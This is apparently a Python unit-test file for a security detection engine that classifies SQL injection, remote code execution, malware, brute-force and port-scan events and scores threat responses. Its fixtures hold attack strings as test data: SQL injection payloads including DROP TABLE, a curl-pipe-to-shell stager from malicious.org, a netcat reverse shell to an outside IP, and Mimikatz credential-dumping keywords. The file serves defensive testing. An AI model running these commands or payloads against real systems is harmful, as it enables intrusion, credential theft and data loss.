import unittest
import asyncio
import os
import sys

# Support running from root directory and from backend directory
backend_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

try:
    from app.services.detection_engine import DetectionEngine
    from app.services.threat_intel import DemoThreatIntelProvider, NVDProvider
    from app.services.scoring_engine import ScoringEngine, ResponseEngine
except ImportError:
    from backend.app.services.detection_engine import DetectionEngine
    from backend.app.services.threat_intel import DemoThreatIntelProvider, NVDProvider
    from backend.app.services.scoring_engine import ScoringEngine, ResponseEngine

class TestPrismSecurityEngine(unittest.TestCase):
    def setUp(self):
        self.detection = DetectionEngine()
        self.intel = DemoThreatIntelProvider()
        self.nvd = NVDProvider()
        self.scoring = ScoringEngine()
        self.response = ResponseEngine(mode="simulation")

    # 1. SQL Injection Tests
    def test_sql_injection_or_equals(self):
        event = {"payload": "' OR '1'='1 --", "url": "/login"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "SQL_INJECTION")
        self.assertGreaterEqual(result["confidence"], 90)

    def test_sql_injection_union_select(self):
        event = {"payload": "UNION SELECT username, password FROM users", "url": "/search"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "SQL_INJECTION")

    def test_sql_injection_drop_table(self):
        event = {"payload": "; DROP TABLE customers;", "url": "/api/users"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "SQL_INJECTION")

    def test_sql_injection_xp_cmdshell(self):
        event = {"payload": "exec xp_cmdshell('dir')", "url": "/admin"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "SQL_INJECTION")

    # 2. Remote Code Execution Tests
    def test_rce_bash_invocation(self):
        event = {"payload": "/bin/bash -c 'whoami'", "process_command": "/bin/bash"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "RCE")
        self.assertGreaterEqual(result["confidence"], 92)

    def test_rce_powershell_encoded(self):
        event = {"payload": "powershell -enc SUVYI...", "process_name": "powershell.exe"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "RCE")

    def test_rce_curl_stager(self):
        event = {"payload": "; curl http://malicious.org/shell.sh | sh", "url": "/exec"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "RCE")

    def test_rce_netcat_reverse_shell(self):
        event = {"payload": "nc -e /bin/sh 185.220.101.45 4444"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "RCE")

    # 3. Malware Tests
    def test_malware_known_hash(self):
        event = {"file_hash": "44d88612fea8a8f36de82e1278abb02f", "process_name": "suspicious.exe"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "MALWARE")

    def test_malware_mimikatz(self):
        event = {"payload": "mimikatz sekurlsa::logonpasswords", "process_name": "proc.exe"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "MALWARE")

    def test_malware_cobalt_strike(self):
        event = {"payload": "cobaltstrike beacon beacon.exe", "url": "/beacon"}
        result = self.detection.detect(event)
        self.assertIsNotNone(result)
        self.assertEqual(result["attack_type"], "MALWARE")

    # 4. Brute Force Tests
    def test_brute_force_failed_logins(self):
        ip = "203.0.113.19"
        for _ in range(3):
            res = self.detection.detect({"source_ip": ip, "event_type": "auth_event", "url": "/login"})
        self.assertIsNotNone(res)
        self.assertEqual(res["attack_type"], "BRUTE_FORCE")

    # 5. Port Scan Tests
    def test_port_scan_reconnaissance(self):
        ip = "198.51.100.99"
        ports = [22, 80, 443]
        for p in ports:
            res = self.detection.detect({"source_ip": ip, "destination_port": p, "event_type": "network_event"})
        self.assertIsNotNone(res)
        self.assertEqual(res["attack_type"], "PORT_SCAN")

    # 6. Benign Traffic
    def test_benign_event_returns_none(self):
        event = {"url": "/index.html", "payload": "normal search query", "source_ip": "10.0.0.1"}
        result = self.detection.detect(event)
        self.assertIsNone(result)

    # 7. Threat Intel Tests
    def test_ioc_check_known_ip(self):
        loop = asyncio.new_event_loop()
        res = loop.run_until_complete(self.intel.check_ip("185.220.101.45"))
        loop.close()
        self.assertIsNotNone(res)
        self.assertEqual(res["threat_level"], "critical")
        self.assertEqual(res["confidence"], 94)

    def test_ioc_check_unknown_ip(self):
        loop = asyncio.new_event_loop()
        res = loop.run_until_complete(self.intel.check_ip("8.8.8.8"))
        loop.close()
        self.assertIsNone(res)

    def test_ioc_check_malicious_domain(self):
        loop = asyncio.new_event_loop()
        res = loop.run_until_complete(self.intel.check_domain("malicious-c2-update.org"))
        loop.close()
        self.assertIsNotNone(res)
        self.assertEqual(res["threat_level"], "critical")

    # 8. CVE Correlation Tests
    def test_cve_correlation_fetch(self):
        loop = asyncio.new_event_loop()
        cves = loop.run_until_complete(self.nvd.fetch_cves("SQL_INJECTION"))
        loop.close()
        self.assertGreater(len(cves), 0)
        self.assertEqual(cves[0]["severity"], "CRITICAL")
        self.assertGreaterEqual(cves[0]["cvss_score"], 9.0)

    # 9. Threat Scoring Tests
    def test_critical_threat_scoring_calculation(self):
        score_res = self.scoring.calculate_score(
            event={"hostname": "db-core-01"},
            attack_type="SQL_INJECTION",
            confidence_pct=95,
            ioc_match=True,
            ioc_threat_level="critical",
            cve_match=True,
            cvss_score=9.8,
            asset_criticality_score=10
        )
        self.assertEqual(score_res["severity"], "CRITICAL")
        self.assertGreaterEqual(score_res["total_score"], 80)
        self.assertEqual(score_res["attack_score"], 35)
        self.assertEqual(score_res["ioc_score"], 25)
        self.assertEqual(score_res["cve_score"], 20)

    def test_low_threat_scoring_calculation(self):
        score_res = self.scoring.calculate_score(
            event={"hostname": "dev-sandbox-04"},
            attack_type="PORT_SCAN",
            confidence_pct=70,
            ioc_match=False,
            ioc_threat_level="low",
            cve_match=False,
            cvss_score=0.0,
            asset_criticality_score=2
        )
        self.assertIn(score_res["severity"], ["LOW", "MEDIUM"])
        self.assertLess(score_res["total_score"], 60)

    # 10. Response Decision Tests
    def test_critical_response_decisions(self):
        decision = self.response.evaluate_response(
            threat_score=94,
            severity="CRITICAL",
            source_ip="185.220.101.45",
            hostname="web-prod-01"
        )
        self.assertTrue(decision["should_block_ip"])
        self.assertTrue(decision["should_isolate_host"])
        self.assertTrue(decision["should_escalate_soc"])
        self.assertEqual(decision["mode"], "SIMULATION")

    def test_low_response_decisions(self):
        decision = self.response.evaluate_response(
            threat_score=25,
            severity="LOW",
            source_ip="10.0.0.5",
            hostname="workstation"
        )
        self.assertFalse(decision["should_block_ip"])
        self.assertFalse(decision["should_escalate_soc"])
        self.assertEqual(len(decision["executed"]), 0)

if __name__ == "__main__":
    unittest.main()
